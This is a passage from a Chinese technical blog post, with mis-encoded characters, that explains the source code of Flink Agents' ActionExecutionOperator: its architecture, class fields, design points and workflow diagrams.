7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ã€å¤§æ•°æ® &amp; AIã€‘Flink Agents æºç è§£è¯» --- (5) --- ActionExecutionOperator</h2>
<ul>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x00 æ‘˜è¦</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x01 åŸºç¡€çŸ¥è¯†</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.1 æ€»ä½“æ¶æ„</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.2 å®šä¹‰</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.3 å…³é”®è®¾è®¡</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.4 æµç¨‹</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.5 ç»„ä»¶ &amp; å…³ç³»</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.6 æ ¸å¿ƒä¾èµ–ç»„ä»¶</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.7 ä¸»è¦åŠŸèƒ½</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.8 è¿è¡ŒActionTaskæµç¨‹</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.8 Flink MailboxExecutor</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x02 ActionExecutionOperator ç”Ÿæˆæœºåˆ¶å’Œç­–ç•¥</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.1 ç”Ÿæˆä½ç½®</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.2 ç”Ÿæˆæœºåˆ¶</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.3 å…³é”®ç”Ÿæˆç­–ç•¥</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.4 æ“ä½œç¬¦åˆå§‹åŒ–è¿‡ç¨‹</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.5 ä¸æ‰§è¡Œç¯å¢ƒçš„é›†æˆ</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.6 æ€»ç»“</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x03 ä»»åŠ¡æ‹†åˆ†æœºåˆ¶è¯¦è§£</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.1 ä»»åŠ¡æ‹†åˆ†çš„åŸºæœ¬åŸç†</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.2 ä»»åŠ¡åˆ›å»ºè¿‡ç¨‹</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x04 ä»»åŠ¡é˜Ÿåˆ—ç®¡ç†</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">4.1 ä»»åŠ¡çŠ¶æ€å­˜å‚¨</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">4.2 ä»»åŠ¡è°ƒåº¦æœºåˆ¶</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">4.3 ä»»åŠ¡å¤„ç†å¾ªç¯</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x05 å®é™…åº”ç”¨ç¤ºä¾‹</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">5.1 å¼‚æ­¥ HTTP è¯·æ±‚å¤„ç†</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">5.2 å¤æ‚ä¸šåŠ¡æµç¨‹å¤„ç†</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0xFF å‚è€ƒ</a></p>
</li>
</ul>
<h3 data-id="heading-1">0x00 æ‘˜è¦</h3>
<p>ActionExecutionOperator æ˜¯æ•´ä¸ªFlink Agent ç³»ç»Ÿçš„æ‰§è¡Œå¼•æ“ï¼Œå®ƒè¿æ¥äº† Flink æµå¤„ç†æ¡†æ¶å’Œ Agent é€»è¾‘ï¼Œåè°ƒå„ç§ç»„ä»¶å®Œæˆäº† Agent å®šä¹‰çš„åŠ¨ä½œæ‰§è¡Œã€‚ActionExecutionOperator ä¸»è¦èŒè´£ï¼š</p>
<ul>
<li>äº‹ä»¶å¤„ç†ï¼šæ¥æ”¶æ¥è‡ªä¸Šæ¸¸çš„æ•°æ®ï¼ŒåŒ…è£…æˆInputEvent</li>
<li>åŠ¨ä½œæ‰§è¡Œï¼šæ ¹æ®Agentå®šä¹‰çš„åŠ¨ä½œè§„åˆ™ï¼Œè§¦å‘ç›¸åº”çš„å¤„ç†é€»è¾‘</li>
<li>çŠ¶æ€ç®¡ç†ï¼šç»´æŠ¤çŸ­æœŸè®°å¿†ï¼Œæ£€æŸ¥ç‚¹çŠ¶æ€ç­‰</li>
<li>å¼‚æ­¥æ”¯æŒï¼šå¤„ç†éœ€è¦å¼‚æ­¥æ‰§è¡Œçš„ä»»åŠ¡</li>
<li>Python/Javaäº¤äº’æ“ä½œï¼šåè°ƒç»„ä»¶é—´çš„äº¤äº’</li>
<li>è¾“å‡ºäº§ç”Ÿï¼šå°†æœ€ç»ˆç»“æœä½œä¸ºOutputEventå‘é€åˆ°ä¸‹æ¸¸</li>
</ul>
<p>è¿™æ ·ï¼Œæ•´ä¸ªAgentçš„é€»è¾‘å°±è¢«é›†æˆåˆ°äº†æ ‡å‡†çš„Flinkæµå¤„ç†ç®¡é“ä¸­ï¼Œèƒ½å¤Ÿåˆ©ç”¨Flinkçš„åˆ†å¸ƒå¼è®¡ç®—èƒ½åŠ›å’Œå®¹é”™æœºåˆ¶ã€‚</p>
<p>æœ¬ç¯‡ä¸»è¦æ˜¯ä¸ºäº†å­¦ä¹  ActionExecutionOperator çš„æ¶æ„ï¼Œç”Ÿæˆæœºåˆ¶å’Œç­–ç•¥ï¼Œä¹Ÿä¼šå­¦ä¹  ActionExecutionOperator å¦‚ä½•ä½¿ç”¨ AgentPlanï¼Œå¦‚ä½•ç”Ÿæˆ ActionTaskã€‚</p>
<h3 data-id="heading-2">0x01 åŸºç¡€çŸ¥è¯†</h3>
<p>ActionExecutionOperator ç®—å­æ˜¯æ•´ä¸ª Flink Agent æ¡†æ¶è¿è¡Œæ—¶çš„æ ¸å¿ƒç»„ä»¶ï¼Œè´Ÿè´£å°†ç”¨æˆ·å®šä¹‰çš„ä»£ç†é€»è¾‘è½¬æ¢ä¸ºå®é™…çš„æµå¤„ç†æ“ä½œã€‚</p>
<h4 data-id="heading-3">1.1 æ€»ä½“æ¶æ„</h4>
<p>å¯ä»¥æŠŠ Flink Agents çš„æ•´ä¸ªæ‰§è¡Œæµç¨‹æ¯”ä½œ â€œåšä¸€é“èœâ€ï¼Œæˆ‘ä»¬å€Ÿæ­¤è¿›è¡Œåˆ†æã€‚</p>
<p>Flink Agents æ˜¯åŸºäºåŸç”Ÿ Flink åˆ†å¸ƒå¼æµå¤„ç†èƒ½åŠ›å°è£…çš„ä¸Šå±‚æ¡†æ¶ã€‚å…¶ä¸­å››ä¸ªä¸»è¦ç»„ä»¶ä»£è¡¨äº† Flink Agents æ¡†æ¶ä¸­çš„å››ä¸ªå±‚æ¬¡ï¼š</p>
<ul>
<li><strong>Agentï¼ˆé¡¶å±‚è®¾è®¡ï¼Œå®šä¹‰äº†â€œåšä»€ä¹ˆâ€ï¼‰</strong> ï¼šç”¨æˆ·å®šä¹‰çš„æ™ºèƒ½å®ä½“ï¼Œç±»ä¼¼ â€œé¤å…èœå• + è§„åˆ™æ‰‹å†Œâ€ï¼ŒåŒ…å«ä¸šåŠ¡é€»è¾‘ã€åŠ¨ä½œï¼ˆActionï¼‰å’Œèµ„æºï¼ˆå·¥å…·ã€æ¨¡å‹ç­‰ï¼‰å®šä¹‰ï¼Œæ˜ç¡® â€œåšä»€ä¹ˆâ€ã€‚</li>
<li><strong>AgentPlanï¼ˆä¸­é—´ç¼–è¯‘å±‚ï¼Œç¡®å®šäº†â€œæ€ä¹ˆåšâ€ï¼‰</strong> ï¼šå°† Agent ç¼–è¯‘åçš„å¯æ‰§è¡Œè®¡åˆ’ï¼Œç±»ä¼¼ â€œè¯¦ç»†æ“ä½œæµç¨‹å›¾â€ï¼Œæ˜ç¡®åŠ¨ä½œè§¦å‘è§„åˆ™ã€èµ„æºæ˜ å°„å…³ç³»ï¼Œç¡®å®š â€œæ€ä¹ˆåšâ€ã€‚</li>
<li><strong>ActionExecutionOperatorï¼ˆè¿è¡Œæ—¶æ‰§è¡Œå±‚ï¼Œæ˜¯æ‰§è¡Œç¯å¢ƒï¼Œè´Ÿè´£â€œåè°ƒè°ƒåº¦â€ï¼‰</strong> ï¼šFlink é›†ç¾¤ä¸­çš„æ‰§è¡Œæ ¸å¿ƒï¼Œåœ¨ Flink æµå¤„ç†ç¯å¢ƒä¸­å®é™…æ‰§è¡Œæ“ä½œï¼Œç±»ä¼¼ â€œé¤å…é¦–å¸­å¤§å¨â€ï¼Œè´Ÿè´£æ¥æ”¶æ•°æ®ã€è°ƒåº¦ä»»åŠ¡ã€ç®¡ç†çŠ¶æ€ï¼Œåè°ƒæ•´ä½“æ‰§è¡Œæµç¨‹ã€‚</li>
<li><strong>ActionTaskï¼ˆæœ€å°æ‰§è¡Œå•å…ƒï¼Œè´Ÿè´£â€œå…·ä½“å®æ–½â€ï¼‰</strong> ï¼šå…·ä½“çš„æ‰§è¡Œä»»åŠ¡ï¼Œç±»ä¼¼ â€œå‘˜å·¥çš„å•ä¸ªæœåŠ¡æ­¥éª¤â€ï¼Œåˆ†ä¸º JavaActionTask å’Œ PythonActionTaskï¼Œå¤„ç†å•ä¸ªäº‹ä»¶å¹¶è¿”å›ç»“æœã€‚</li>
</ul>
<p>å…·ä½“å¯ä»¥å‚è§ä¸‹å›¾ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">Agent</span>]Â èœå•æ‰‹å†Œ
Â Â Â Â â†“ï¼ˆç¼–è¯‘ï¼‰
[<span class="hljs-meta">AgentPlan</span>]Â è¯¦ç»†æµç¨‹å›¾
Â Â Â Â â†“ï¼ˆè¿è¡Œæ—¶å®ä¾‹åŒ–ï¼‰
[<span class="hljs-meta">ActionExecutionOperator</span>]Â é¤å…é¦–å¸­å¤§å¨
Â Â Â Â â†“ï¼ˆåˆ†é…ä»»åŠ¡ï¼‰
[<span class="hljs-meta">ActionTask</span>]Â å‘˜å·¥å…·ä½“ä»»åŠ¡
</code></pre>
<p>è¿™æ ·çš„è®¾è®¡ä½¿å¾—ç³»ç»Ÿæ—¢çµæ´»åˆé«˜æ•ˆï¼Œèƒ½å¤Ÿå¤„ç†å¤æ‚çš„AIä»£ç†ä»»åŠ¡ï¼ŒåŒæ—¶ä¿è¯äº†è‰¯å¥½çš„æ‰©å±•æ€§å’Œç»´æŠ¤æ€§ã€‚</p>
<h4 data-id="heading-4">1.2 å®šä¹‰</h4>
<p>ActionExecutionOperator çš„å®šä¹‰å¦‚ä¸‹ã€‚</p>
<pre><code class="hljs language-vbnet" lang="vbnet">/**
Â *Â AnÂ <span class="hljs-keyword">operator</span>Â thatÂ executesÂ theÂ actionsÂ definedÂ <span class="hljs-keyword">in</span>Â theÂ agent.Â UponÂ receivingÂ dataÂ <span class="hljs-keyword">from</span>Â the
Â *Â upstream,Â itÂ firstÂ wrapsÂ theÂ dataÂ <span class="hljs-keyword">into</span>Â anÂ {@linkÂ InputEvent}.Â ItÂ <span class="hljs-keyword">then</span>Â invokesÂ theÂ corresponding
Â *Â actionÂ thatÂ <span class="hljs-built_in">is</span>Â interestedÂ <span class="hljs-keyword">in</span>Â theÂ {@linkÂ InputEvent},Â <span class="hljs-built_in">and</span>Â collectsÂ theÂ outputÂ <span class="hljs-keyword">event</span>Â producedÂ <span class="hljs-keyword">by</span>
Â *Â theÂ action.
Â *
Â *Â &lt;p&gt;<span class="hljs-keyword">For</span>Â eventsÂ <span class="hljs-keyword">of</span>Â typeÂ {@linkÂ OutputEvent},Â theÂ dataÂ containedÂ <span class="hljs-keyword">in</span>Â theÂ <span class="hljs-keyword">event</span>Â <span class="hljs-built_in">is</span>Â sentÂ downstream.
Â *Â <span class="hljs-keyword">For</span>Â allÂ otherÂ <span class="hljs-keyword">event</span>Â types,Â theÂ processÂ <span class="hljs-built_in">is</span>Â repeated:Â theÂ <span class="hljs-keyword">event</span>Â triggersÂ theÂ correspondingÂ action,
Â *Â <span class="hljs-built_in">and</span>Â theÂ resultingÂ outputÂ <span class="hljs-keyword">event</span>Â <span class="hljs-built_in">is</span>Â collectedÂ <span class="hljs-keyword">for</span>Â furtherÂ processing.
Â */
<span class="hljs-keyword">public</span>Â <span class="hljs-keyword">class</span>Â ActionExecutionOperator&lt;<span class="hljs-keyword">IN</span>,Â OUT&gt;Â extendsÂ AbstractStreamOperator&lt;OUT&gt;
Â Â Â Â Â Â Â Â <span class="hljs-keyword">implements</span>Â OneInputStreamOperator&lt;<span class="hljs-keyword">IN</span>,Â OUT&gt;,Â BoundedOneInputÂ {

Â Â Â Â <span class="hljs-keyword">private</span>Â <span class="hljs-keyword">static</span>Â finalÂ <span class="hljs-type">long</span>Â serialVersionUIDÂ =Â <span class="hljs-number">1L</span>;

Â Â Â Â <span class="hljs-keyword">private</span>Â <span class="hljs-keyword">static</span>Â finalÂ LoggerÂ LOGÂ =Â LoggerFactory.getLogger(ActionExecutionOperator.<span class="hljs-keyword">class</span>);

Â Â Â Â <span class="hljs-keyword">private</span>Â <span class="hljs-keyword">static</span>Â finalÂ <span class="hljs-type">String</span>Â RECOVERY_MARKER_STATE_NAMEÂ =Â <span class="hljs-string">"recoveryMarker"</span>;
Â Â Â Â <span class="hljs-keyword">private</span>Â <span class="hljs-keyword">static</span>Â finalÂ <span class="hljs-type">String</span>Â MESSAGE_SEQUENCE_NUMBER_STATE_NAMEÂ =Â <span class="hljs-string">"messageSequenceNumber"</span>;
Â Â Â Â <span class="hljs-keyword">private</span>Â <span class="hljs-keyword">static</span>Â finalÂ <span class="hljs-type">String</span>Â PENDING_INPUT_EVENT_STATE_NAMEÂ =Â <span class="hljs-string">"pendingInputEvents"</span>;

Â Â Â Â <span class="hljs-keyword">private</span>Â finalÂ AgentPlanÂ agentPlan;

Â Â Â Â <span class="hljs-keyword">private</span>Â finalÂ <span class="hljs-type">Boolean</span>Â inputIsJava;

Â Â Â Â <span class="hljs-keyword">private</span>Â transientÂ StreamRecord&lt;OUT&gt;Â reusedStreamRecord;

Â Â Â Â <span class="hljs-keyword">private</span>Â transientÂ MapState&lt;<span class="hljs-type">String</span>,Â MemoryObjectImpl.MemoryItem&gt;Â shortTermMemState;

Â Â Â Â //Â PythonActionExecutorÂ <span class="hljs-keyword">for</span>Â PythonÂ actions
Â Â Â Â <span class="hljs-keyword">private</span>Â transientÂ PythonActionExecutorÂ pythonActionExecutor;

Â Â Â Â <span class="hljs-keyword">private</span>Â transientÂ FlinkAgentsMetricGroupImplÂ metricGroup;

Â Â Â Â <span class="hljs-keyword">private</span>Â transientÂ BuiltInMetricsÂ builtInMetrics;

Â Â Â Â <span class="hljs-keyword">private</span>Â transientÂ SegmentedQueueÂ keySegmentQueue;

Â Â Â Â <span class="hljs-keyword">private</span>Â finalÂ transientÂ MailboxExecutorÂ mailboxExecutor;

Â Â Â Â //Â WeÂ needÂ <span class="hljs-keyword">to</span>Â checkÂ whetherÂ theÂ currentÂ threadÂ <span class="hljs-built_in">is</span>Â theÂ mailboxÂ threadÂ <span class="hljs-keyword">using</span>Â theÂ mailbox
Â Â Â Â //Â processor.
Â Â Â Â //Â TODO:Â ThisÂ <span class="hljs-built_in">is</span>Â aÂ temporaryÂ workaround.Â <span class="hljs-keyword">In</span>Â theÂ future,Â weÂ shouldÂ addÂ anÂ <span class="hljs-keyword">interface</span>Â <span class="hljs-keyword">in</span>
Â Â Â Â //Â MailboxExecutorÂ <span class="hljs-keyword">to</span>Â checkÂ whetherÂ aÂ threadÂ <span class="hljs-built_in">is</span>Â aÂ mailboxÂ thread,Â ratherÂ thanÂ <span class="hljs-keyword">using</span>Â reflection
Â Â Â Â //Â <span class="hljs-keyword">to</span>Â obtainÂ theÂ MailboxProcessorÂ instanceÂ <span class="hljs-built_in">and</span>Â makeÂ theÂ determination.
Â Â Â Â <span class="hljs-keyword">private</span>Â transientÂ MailboxProcessorÂ mailboxProcessor;

Â Â Â Â //Â AnÂ actionÂ willÂ beÂ splitÂ <span class="hljs-keyword">into</span>Â oneÂ <span class="hljs-built_in">or</span>Â moreÂ ActionTaskÂ objects.Â WeÂ useÂ aÂ stateÂ <span class="hljs-keyword">to</span>Â storeÂ the
Â Â Â Â //Â pendingÂ ActionTasksÂ thatÂ areÂ waitingÂ <span class="hljs-keyword">to</span>Â beÂ executed.
Â Â Â Â <span class="hljs-keyword">private</span>Â transientÂ ListState&lt;ActionTask&gt;Â actionTasksKState;

Â Â Â Â //Â <span class="hljs-keyword">To</span>Â avoidÂ processingÂ differentÂ InputEventsÂ <span class="hljs-keyword">with</span>Â theÂ sameÂ <span class="hljs-keyword">key</span>,Â weÂ useÂ aÂ stateÂ <span class="hljs-keyword">to</span>Â storeÂ pending
Â Â Â Â //Â InputEventsÂ thatÂ areÂ waitingÂ <span class="hljs-keyword">to</span>Â beÂ processed.
Â Â Â Â <span class="hljs-keyword">private</span>Â transientÂ ListState&lt;<span class="hljs-keyword">Event</span>&gt;Â pendingInputEventsKState;

Â Â Â Â //Â AnÂ <span class="hljs-keyword">operator</span>Â stateÂ <span class="hljs-built_in">is</span>Â usedÂ <span class="hljs-keyword">to</span>Â trackÂ theÂ currentlyÂ processingÂ keys.Â ThisÂ <span class="hljs-built_in">is</span>Â usefulÂ <span class="hljs-keyword">when</span>
Â Â Â Â //Â receivingÂ anÂ EndOfInputÂ signal,Â <span class="hljs-keyword">as</span>Â weÂ needÂ <span class="hljs-keyword">to</span>Â waitÂ <span class="hljs-keyword">until</span>Â allÂ relatedÂ eventsÂ areÂ fully
Â Â Â Â //Â processed.
Â Â Â Â <span class="hljs-keyword">private</span>Â transientÂ ListState&lt;<span class="hljs-type">Object</span>&gt;Â currentProcessingKeysOpState;

Â Â Â Â <span class="hljs-keyword">private</span>Â finalÂ transientÂ EventLoggerÂ eventLogger;
Â Â Â Â <span class="hljs-keyword">private</span>Â finalÂ transientÂ List&lt;EventListener&gt;Â eventListeners;

Â Â Â Â <span class="hljs-keyword">private</span>Â transientÂ ActionStateStoreÂ actionStateStore;
Â Â Â Â <span class="hljs-keyword">private</span>Â transientÂ ValueState&lt;<span class="hljs-type">Long</span>&gt;Â sequenceNumberKState;
Â Â Â Â <span class="hljs-keyword">private</span>Â transientÂ ListState&lt;<span class="hljs-type">Object</span>&gt;Â recoveryMarkerOpState;
Â Â Â Â <span class="hljs-keyword">private</span>Â transientÂ Map&lt;<span class="hljs-type">Long</span>,Â Map&lt;<span class="hljs-type">Object</span>,Â <span class="hljs-type">Long</span>&gt;&gt;Â checkpointIdToSeqNums;

Â Â Â Â //Â ThisÂ <span class="hljs-keyword">in</span>Â memoryÂ mapÂ keepÂ trackÂ <span class="hljs-keyword">of</span>Â theÂ runnerÂ contextÂ <span class="hljs-keyword">for</span>Â theÂ <span class="hljs-keyword">async</span>Â actionÂ taskÂ thatÂ having
Â Â Â Â //Â beenÂ finished
Â Â Â Â <span class="hljs-keyword">private</span>Â finalÂ transientÂ Map&lt;ActionTask,Â RunnerContextImpl&gt;Â actionTaskRunnerContexts;
</code></pre>
<h4 data-id="heading-5">1.3 å…³é”®è®¾è®¡</h4>
<p>ActionExecutionOperator å…³é”®è®¾è®¡è¦ç‚¹å¦‚ä¸‹ï¼š</p>
<ul>
<li>çŠ¶æ€ç®¡ç†ï¼šä½¿ç”¨Flinkçš„çŠ¶æ€åç«¯ç®¡ç†çŸ­æœŸè®°å¿†å’Œå¤„ç†çŠ¶æ€</li>
<li>å¼‚æ­¥æ”¯æŒï¼šé€šè¿‡é‚®ç®±çº¿ç¨‹æœºåˆ¶æ”¯æŒå¼‚æ­¥æ“ä½œæ‰§è¡Œ</li>
<li>å®¹é”™æ¢å¤ï¼šé€šè¿‡checkpointæœºåˆ¶å®ç°çŠ¶æ€æŒä¹…åŒ–å’Œæ¢å¤</li>
<li>èµ„æºéš”ç¦»ï¼šæ¯ä¸ªkeyæ‹¥æœ‰ç‹¬ç«‹çš„å¤„ç†ä¸Šä¸‹æ–‡å’ŒçŠ¶æ€</li>
<li>å¤šè¯­è¨€æ”¯æŒï¼šåŒæ—¶æ”¯æŒJavaå’ŒPythonå®ç°çš„åŠ¨ä½œ</li>
<li>è¿™ç§è®¾è®¡ä½¿å¾—å¤æ‚çš„Agenté€»è¾‘èƒ½å¤Ÿåœ¨Flinkçš„åˆ†å¸ƒå¼æµå¤„ç†ç¯å¢ƒä¸­é«˜æ•ˆã€å¯é åœ°æ‰§è¡Œ</li>
</ul>
<h4 data-id="heading-6">1.4 æµç¨‹</h4>
<p>ActionExecutionOperator çš„å·¥ä½œæµç¨‹ï¼š</p>
<ul>
<li>æ¥æ”¶æ•°æ®ï¼šä»ä¸Šæ¸¸æ¥æ”¶æ•°æ®å¹¶åŒ…è£…æˆ InputEvent</li>
<li>åŠ¨ä½œè§¦å‘ï¼šä¾æ®äº‹ä»¶ç±»å‹æŸ¥æ‰¾å¹¶è§¦å‘ç›¸åº”çš„åŠ¨ä½œ</li>
<li>åŠ¨ä½œæ‰§è¡Œï¼šæ‰§è¡ŒåŠ¨ä½œé€»è¾‘ï¼Œå¯èƒ½äº§ç”Ÿæ–°çš„äº‹ä»¶</li>
<li>äº‹ä»¶å¤„ç†ï¼šå¤„ç†åŠ¨ä½œäº§ç”Ÿçš„äº‹ä»¶ï¼Œå¦‚æœæ˜¯è¾“å…¥äº‹ä»¶åˆ™å‘é€ç»™ä¸‹æ¸¸</li>
<li>çŠ¶æ€æ›´æ–°ï¼šæ›´æ–°å†…å­˜çŠ¶æ€å’Œæ‰§è¡ŒçŠ¶æ€</li>
<li>å¾ªç¯å¤„ç†ï¼šç»§ç»­å¤„ç†æ–°äº§ç”Ÿçš„äº‹ä»¶ï¼Œç›´åˆ°æ²¡æœ‰å¾…å¤„ç†çš„äº‹ä»¶ã€‚</li>
</ul>
<p>å…³é”®ç‰¹æ€§ï¼š</p>
<ul>
<li>äº‹ä»¶é©±åŠ¨ï¼šåŸºäºäº‹ä»¶çš„å¤„ç†æ¨¡å‹ï¼Œäº‹ä»¶è§¦å‘åŠ¨ä½œæ‰§è¡Œ</li>
<li>çŠ¶æ€ä¸€è‡´æ€§ï¼šé€šè¿‡Flinkçš„çŠ¶æ€ç®¡ç†æ¥ä¿è¯å¤„ç†ä¸€è‡´æ€§</li>
<li>å®¹é”™æ¢å¤ï¼šæ”¯æŒä»æ£€æŸ¥ç‚¹æ¢å¤æ‰§è¡ŒçŠ¶æ€</li>
<li>æ··åˆæ‰§è¡Œï¼šåŒæ—¶æ”¯æŒ java å’Œ python åŠ¨ä½œçš„æ‰§è¡Œ</li>
<li>å†…å­˜ç®¡ç†ï¼šç®¡ç†Agentçš„çŸ­æœŸå†…å­˜çŠ¶æ€</li>
</ul>
<p>ä½¿ç”¨æµç¨‹å›¾å¦‚ä¸‹</p>
<pre><code class="hljs language-css" lang="css">graph <span class="hljs-selector-tag">TD</span>
	<span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[AgentsExecutionEnvironment]</span> --&gt; <span class="hljs-selector-tag">B</span><span class="hljs-selector-attr">[RemoteExecutionEnvironment]</span>
	<span class="hljs-selector-tag">B</span> --&gt; C<span class="hljs-selector-attr">[ActionExecutionOperator]</span>
	C --&gt; D<span class="hljs-selector-attr">[AgentPlan]</span>
	C --&gt; D<span class="hljs-selector-attr">[Flink State Backend]</span>
	C --&gt; D<span class="hljs-selector-attr">[Python Components]</span>
	C --&gt; D<span class="hljs-selector-attr">[Event Processing Components]</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1071b67850a6490094d8458c595692dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768481060&amp;x-signature=d%2FsuEBKkkkWUjM1GsfLokg3E5tM%3D" alt="ActionExecutionOperator-flow-2" loading="lazy"/></p>
<p>ActionExecutionOperator-flow-2</p>
<h4 data-id="heading-7">1.5 ç»„ä»¶ &amp; å…³ç³»</h4>
<p>ActionExecutionOperator æ˜¯ Flink Agent ç³»ç»Ÿä¸­çš„æ ¸å¿ƒæ‰§è¡Œç»„ä»¶ï¼Œä½äº Flink æµå¤„ç†ç®¡é“ä¸­ï¼Œè´Ÿè´£æ‰§è¡Œ Agent å®šä¹‰çš„å„ç§åŠ¨ä½œã€‚å…¶ä¸»è¦äº¤äº’ç»„ä»¶å¦‚ä¸‹ï¼š</p>
<p><strong>ä¸Šæ¸¸ç»„ä»¶</strong></p>
<ul>
<li>DataStream APIï¼šä½œä¸º Flink æµå¤„ç†ç®¡é“ä¸­çš„æ“ä½œç¬¦ï¼Œæ¥æ”¶æ¥è‡ªä¸Šæ¸¸ DataStream çš„æ•°æ®</li>
<li>Input æ•°æ®æºï¼šæ¥æ”¶å„ç§ç±»å‹çš„è¾“å…¥æ•°æ®ï¼Œå°†å…¶åŒ…è£…ä¸º InputEvent</li>
<li>KeyedStreamï¼šå¤„ç†æŒ‰é”®åˆ†ç»„çš„æ•°æ®æµ</li>
</ul>
<p><strong>ä¸‹æ¸¸ç»„ä»¶</strong></p>
<ul>
<li>Output æ•°æ®æ¥æ”¶å™¨ï¼šå°†OutputEvent ä¸­çš„æ•°æ®å‘é€åˆ°ä¸‹æ¸¸æ“ä½œç¬¦</li>
<li>DataStream APIï¼šè¾“å‡ºå¤„ç†ç»“æœåˆ°ä¸‹æ¸¸ DataStream æ“ä½œç¬¦</li>
</ul>
<p><strong>æ ¸å¿ƒä¾èµ–ç»„ä»¶</strong></p>
<p>å·¥ä½œæµç¨‹ä¸­çš„äº¤äº’</p>
<pre><code class="hljs language-css" lang="css">graph <span class="hljs-selector-tag">TD</span>
	<span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[DataStream Source]</span> --&gt; <span class="hljs-selector-tag">B</span><span class="hljs-selector-attr">[ActionExecutionOperator]</span>
	<span class="hljs-selector-tag">B</span> --&gt; C<span class="hljs-selector-attr">[DataStream Sink]</span>
	<span class="hljs-selector-tag">B</span> --&gt; D<span class="hljs-selector-attr">[AgentPlan]</span>
	<span class="hljs-selector-tag">B</span> --&gt; E<span class="hljs-selector-attr">[ActionTask]</span>
	<span class="hljs-selector-tag">B</span> --&gt; F<span class="hljs-selector-attr">[RunnerContext]</span>
	<span class="hljs-selector-tag">B</span> --&gt; G<span class="hljs-selector-attr">[Flink State Backend]</span>
	<span class="hljs-selector-tag">B</span> --&gt; H<span class="hljs-selector-attr">[PythonActionExecutor]</span>
